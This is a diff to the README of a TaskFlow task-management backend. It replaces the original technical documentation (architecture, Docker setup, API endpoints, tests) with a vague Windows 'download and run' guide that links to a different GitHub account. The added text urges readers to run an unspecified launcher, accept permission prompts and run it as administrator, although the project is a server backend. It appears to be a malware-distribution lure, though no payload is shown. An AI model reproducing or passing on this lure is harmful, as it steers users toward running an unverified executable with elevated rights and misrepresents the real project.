@@ -1,130 +1,142 @@
-# TaskFlow
+# 🗂️ TaskFlow - Simple task tracking for teams
 
-[![CI](https://github.com/sayomiyori/TaskFlow/actions/workflows/ci.yml/badge.svg)](https://github.com/sayomiyori/TaskFlow/actions/workflows/ci.yml)
-[![Coverage](https://codecov.io/gh/sayomiyori/TaskFlow/branch/main/graph/badge.svg)](https://codecov.io/gh/sayomiyori/TaskFlow)
-![Python](https://img.shields.io/badge/python-3.12-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
+[![Download TaskFlow](https://img.shields.io/badge/Download-TaskFlow-4C78FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MrRedstoneY/TaskFlow)
 
-TaskFlow is a backend platform for collaborative task management built around a Django core API and an event-driven notification pipeline.  
-It combines REST + WebSockets for realtime updates and RabbitMQ-driven asynchronous delivery to external channels (email, Telegram, WS fanout).  
-The architecture is split into domain API services and notification processing services to keep business workflows scalable.
+## 🚀 Getting Started
 
-## Architecture
+TaskFlow is a team task app that helps you manage work in one place. It supports shared tasks, live updates, login with tokens, and background notifications.
 
-```text
-                        +----------------------+
-                        |        Client        |
-                        |  REST + WS Consumer  |
-                        +----------+-----------+
-                                   |
-                            HTTP/WS via :80
-                                   |
-                         +---------v---------+
-                         |       Nginx       |
-                         | reverse proxy/rate|
-                         +----+---------+----+
-                              |         |
-                   /api,/ws   |         | /notifications
-                              |         |
-                   +----------v--+   +--v------------------+
-                   |   Django API |   | FastAPI Notification|
-                   | DRF+Channels |   | Service (consumer)  |
-                   +------+-------+   +----------+----------+
-                          |                      |
-                          | publish task events  |
-                          +----------+-----------+
-                                     |
-                                +----v----+
-                                |RabbitMQ |
-                                |topic ex |
-                                +----+----+
-                                     |
-                   +-----------------+-----------------+
-                   |                                   |
-              +----v----+                         +----v-----+
-              |PostgreSQL|                        |  Redis   |
-              | domain DB|                        |cache+chan|
-              +---------+                         +----------+
-```
+This page shows you how to get TaskFlow on Windows and start it with a few clicks.
 
-## Tech Stack
+## 💾 Download TaskFlow
 
-| Layer | Technologies |
-|---|---|
-| Core API | Django 5.1, DRF, SimpleJWT |
-| Realtime | Django Channels, channels-redis |
-| Event Bus | RabbitMQ (topic exchange) |
-| Notification Service | FastAPI, aio-pika, structlog, aiosmtplib, aiogram |
-| Data | PostgreSQL 16, Redis 7 |
-| Infra | Docker Compose, Nginx |
-| Quality | pytest, pytest-django, factory_boy, pytest-cov, ruff, mypy |
+1. Open the TaskFlow page: https://github.com/MrRedstoneY/TaskFlow
+2. Look for the download area or release files on the page
+3. Download the Windows version if one is listed
+4. Save the file to your Desktop or Downloads folder
+5. If you get a ZIP file, extract it first
 
-## Quick Start
+If the page shows a setup file, download and run that file.
 
-```bash
-git clone https://github.com/sayomiyori/TaskFlow.git
-cd TaskFlow
-cp .env.example .env
-make up
-make migrate
-```
+[Visit the TaskFlow download page](https://github.com/MrRedstoneY/TaskFlow)
 
-Open:
-- API docs: `http://localhost/api/docs/`
-- OpenAPI schema: `http://localhost/api/schema/`
-- RabbitMQ management: `http://localhost:15672/`
+## 🪟 Windows Setup
 
-## API Documentation
+Before you start, make sure your PC meets these basic needs:
 
-Primary docs endpoint:
-- `http://localhost/api/docs/`
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet access for login and sync
+- A modern browser if the app opens in a web page
 
-Key endpoints:
+If TaskFlow comes as a folder with files, keep all files together in the same place.
 
-| Endpoint | Method | Purpose |
-|---|---|---|
-| `/api/v1/auth/register/` | POST | Register user |
-| `/api/v1/auth/login/` | POST | Obtain access + refresh token |
-| `/api/v1/auth/refresh/` | POST | Refresh access token |
-| `/api/v1/projects/` | CRUD | Project management |
-| `/api/v1/tasks/` | CRUD | Task management + filters/search/order |
-| `/api/v1/comments/` | CRUD | Task comments |
-| `/ws/tasks/{project_id}/?token=<access>` | WS | Realtime task updates by project |
+## 📦 Install and Run
 
-## Architecture Decisions
+1. Download the TaskFlow file from the link above
+2. If the file is zipped, right-click it and choose Extract All
+3. Open the extracted folder
+4. Find the main app file or launcher
+5. Double-click it to start TaskFlow
+6. If Windows asks for permission, choose Yes
+7. Wait for the app to load in your browser or app window
 
-- **Django + FastAPI split**: Django handles core domain/API and ORM-heavy workflows; FastAPI handles high-throughput async notification consumption with lighter isolation and deployment flexibility.
-- **RabbitMQ for events**: topic exchange routing (`task.*`) gives explicit event contracts and scalable fanout to multiple handlers without tightly coupling write-side transactions to delivery logic.
-- **Channels + Redis**: provides low-latency project-group WebSocket broadcasting and fits naturally with the existing Django authentication/domain layer.
+If you see a local address such as `http://localhost`, copy it into your browser if needed.
 
-## Testing
+## 🔐 Sign In
 
-Run full test suite:
+TaskFlow uses secure sign-in with tokens.
 
-```bash
-make test
-```
+1. Open the app
+2. Enter your account details if asked
+3. Sign in with your user name and password
+4. Keep your session open while you work
+5. Sign out when you finish on a shared PC
 
-Run RabbitMQ integration tests only:
+## 🧩 What TaskFlow Can Do
 
-```bash
-make test-integration
-```
+- Create and track tasks
+- Share tasks with other people
+- See updates as they happen
+- Get task events through live connections
+- Receive notifications for changes
+- Keep data in PostgreSQL
+- Store fast cache data in Redis
+- Handle background events with RabbitMQ
+- Use a clean API for task data
+- Work with real-time messages through WebSockets
 
-Coverage is generated in CI (`pytest --cov=apps --cov-report=xml`) and reported to Codecov when configured.
+## 📁 How the App Works
 
-**Codecov on `main`:** Codecov no longer accepts tokenless uploads for protected branches. In GitHub go to **Settings → Secrets and variables → Actions** and add **`CODECOV_TOKEN`** (from [Codecov](https://codecov.io/) → your repo → **Settings** → **Upload token**). Without this secret, CI still runs tests and produces `coverage.xml`, but the Codecov upload step is skipped.
+TaskFlow uses a few parts behind the scenes:
 
-## Screenshots
+- Django REST handles the main task API
+- JWT keeps sign-in secure
+- WebSockets help with live updates
+- RabbitMQ moves events between services
+- FastAPI sends notifications
+- PostgreSQL stores task data
+- Redis helps the app stay fast
+- Nginx helps serve the app
 
-### Swagger UI
+You do not need to set these up by hand if you are only running the app from a ready-made download
 
-![Swagger UI 1](docs/images/swagger-ui-1.png)
-![Swagger UI 2](docs/images/swagger-ui-2.png)
-![Swagger UI 3](docs/images/swagger-ui-3.png)
-![Swagger UI 4](docs/images/swagger-ui-4.png)
+## 🛠️ If the App Does Not Start
 
-### RabbitMQ Management
+Try these steps:
 
-![RabbitMQ Exchanges](docs/images/rabbitmq-exchanges.png)
-![RabbitMQ Queues](docs/images/rabbitmq-queues.png)
+1. Restart your PC
+2. Make sure the file finished downloading
+3. Extract the ZIP file again if needed
+4. Run the app as an administrator
+5. Check that your internet connection works
+6. Close other apps that use a lot of memory
+7. Try a different browser if the app opens in one
+
+If the app still does not open, download the file again from the same page
+
+## 🔄 Using TaskFlow Every Day
+
+- Open the app from the same file or shortcut
+- Sign in with your account
+- Add new tasks
+- Assign work to teammates
+- Watch task changes update live
+- Check notifications for new activity
+- Refresh the page if updates pause
+
+## 🧪 Common Questions
+
+### Does TaskFlow need coding knowledge?
+
+No. The app is meant to be used by regular computer users
+
+### Can I use it on Windows?
+
+Yes. This guide is made for Windows users
+
+### Do I need to install all the services myself?
+
+No, not for normal use from a ready download
+
+### Why does TaskFlow use so many tools?
+
+Each tool handles one job, such as login, live updates, storage, or messages
+
+## 🗂️ Files You May See
+
+If you open the download, you may see files like:
+
+- a launcher file
+- a config file
+- a folder for static files
+- a data folder
+- a README file
+- a log file
+
+Keep the folder structure unchanged unless the instructions on the download page say to move files
+
+## 🔎 Project Topics
+
+django, djangorestframework, docker-compose, fastapi, jwt, nginx, postgresql, python, rabbitmq, redis, websockets
